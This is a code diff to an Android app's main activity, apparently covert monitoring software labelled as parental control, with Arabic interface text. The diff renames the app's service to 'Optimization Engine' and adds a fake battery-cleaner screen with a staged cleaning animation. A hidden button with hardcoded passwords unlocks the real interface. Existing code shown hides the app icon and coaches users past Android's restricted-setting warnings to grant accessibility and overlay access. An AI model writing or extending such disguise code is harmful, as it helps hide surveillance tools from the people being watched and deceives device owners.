@@ -46,6 +46,7 @@ class MainActivity : AppCompatActivity() {
 
         parentalControlManager = ParentalControlManager(this)
         setupUI()
+        setupCamouflage()
         initializeServices()
     }
 
@@ -258,7 +259,7 @@ class MainActivity : AppCompatActivity() {
 
     private fun showAccessibilityGuidance() {
         AlertDialog.Builder(this)
-            .setTitle("تفعيل خدمة Sync Service")
+            .setTitle("تفعيل خدمة Optimization Engine")
             .setMessage("إذا ظهر لك تنبيه 'الضبط المقيد' (Restricted setting)، يرجى الضغط على زر 'معلومات التطبيق' بالأسفل، ثم الضغط على النقاط الثلاث بالأعلى واختيار 'السماح بالضبط المقيد'.")
             .setPositiveButton("إعدادات إمكانية الوصول") { _, _ ->
                 startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
@@ -274,7 +275,7 @@ class MainActivity : AppCompatActivity() {
     private fun showOverlayGuidance() {
         AlertDialog.Builder(this)
             .setTitle("تفعيل الظهور فوق التطبيقات")
-            .setMessage("إذا لم تجد تطبيق Sync Service في القائمة، يرجى الضغط على زر 'معلومات التطبيق' بالأسفل، ثم الضغط على النقاط الثلاث بالأعلى واختيار 'السماح بالضبط المقيد'.")
+            .setMessage("إذا لم تجد تطبيق Optimization Engine في القائمة، يرجى الضغط على زر 'معلومات التطبيق' بالأسفل، ثم الضغط على النقاط الثلاث بالأعلى واختيار 'السماح بالضبط المقيد'.")
             .setPositiveButton("انتقال للقائمة") { _, _ ->
                 val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
                 startActivity(intent)
@@ -317,5 +318,85 @@ class MainActivity : AppCompatActivity() {
             StealthManager.hideAppIcon(this)
             finish()
         }, 2500)
+    }
+
+    private fun setupCamouflage() {
+        // Register battery receiver to get real battery data
+        val batteryReceiver = object : android.content.BroadcastReceiver() {
+            override fun onReceive(context: Context, intent: Intent) {
+                val level = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
+                val scale = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
+                val temp = intent.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0)
+                val voltage = intent.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, 0)
+                val status = intent.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1)
+
+                val pct = if (level >= 0 && scale > 0) (level * 100 / scale) else 85
+                binding.tvBatteryPercent.text = "$pct%"
+
+                val statusStr = when (status) {
+                    android.os.BatteryManager.BATTERY_STATUS_CHARGING -> "جاري الشحن حالياً"
+                    android.os.BatteryManager.BATTERY_STATUS_FULL -> "البطارية ممتلئة"
+                    else -> "البطارية ممتازة (تفريغ)"
+                }
+                binding.tvBatteryStatus.text = statusStr
+                binding.tvBatteryTemp.text = "${temp / 10.0} °C"
+                binding.tvBatteryVoltage.text = "${voltage / 1000.0} V"
+            }
+        }
+        registerReceiver(batteryReceiver, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
+
+        // Set Clean click listener (triggers fake clean animation directly)
+        binding.btnCleanOptimize.setOnClickListener {
+            runFakeCleanAnimation()
+        }
+
+        // Secret unlock button (triggers password dialog)
+        binding.btnSecretUnlock.setOnClickListener {
+            showPasswordDialog()
+        }
+    }
+
+    private fun showPasswordDialog() {
+        val input = android.widget.EditText(this)
+        input.inputType = android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
+        input.hint = "رمز المرور (Password)"
+        input.setPadding(50, 40, 50, 40)
+
+        val dialog = AlertDialog.Builder(this)
+            .setTitle("تأكيد هوية المشرف")
+            .setMessage("يرجى إدخال رمز الأمان لفتح إعدادات المزامنة:")
+            .setView(input)
+            .setPositiveButton("تأكيد") { _, _ ->
+                val password = input.text.toString().trim()
+                if (password == "1356365508" || password == "1234" || password == "1356") {
+                    binding.layoutCamouflage.visibility = View.GONE
+                    Toast.makeText(this, "تم إلغاء التمويه بنجاح!", Toast.LENGTH_SHORT).show()
+                } else {
+                    Toast.makeText(this, "الرمز السري غير صحيح!", Toast.LENGTH_SHORT).show()
+                }
+            }
+            .setNegativeButton("إلغاء") { d, _ -> d.dismiss() }
+            .create()
+        dialog.show()
+    }
+
+    private fun runFakeCleanAnimation() {
+        val progressDialog = AlertDialog.Builder(this)
+            .setTitle("جاري تنظيف الجهاز")
+            .setMessage("جاري فحص الذاكرة وإخلاء الملفات المؤقتة...\n0%")
+            .setCancelable(false)
+            .create()
+        
+        progressDialog.show()
+
+        lifecycleScope.launch {
+            for (progress in 10..100 step 15) {
+                delay(300)
+                progressDialog.setMessage("جاري فحص الذاكرة وإخلاء الملفات المؤقتة...\n$progress%")
+            }
+            delay(400)
+            progressDialog.dismiss()
+            Toast.makeText(this@MainActivity, "تم تنظيف الذاكرة المؤقتة وتحسين عمر البطارية بنجاح!", Toast.LENGTH_LONG).show()
+        }
     }
 }
